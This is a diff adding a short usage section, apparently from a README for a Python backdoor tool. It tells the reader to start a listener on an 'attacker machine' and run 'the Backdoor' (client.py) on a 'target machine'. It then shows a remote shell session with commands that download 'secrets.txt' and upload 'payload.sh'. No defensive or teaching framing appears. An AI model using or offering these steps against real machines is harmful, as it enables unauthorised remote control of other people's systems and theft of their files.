@@ -1,0 +1,25 @@
+🧪 How to Use
+🖥️ Step-by-step Demo
+1. Start the Listener
+On your attacker machine:
+
+python3 server.py
+Output:
+
+[+] Listening...
+2. Run the Backdoor
+On the target machine:
+
+python3 client.py
+Output (on attacker’s server):
+
+[+] Got connection from ('192.168.1.105', 56432)
+Shell#:
+3. Start Commanding
+From server.py, try:
+
+Shell#: whoami
+Shell#: ls
+Shell#: cd /tmp
+Shell#: download secrets.txt
+Shell#: upload payload.sh
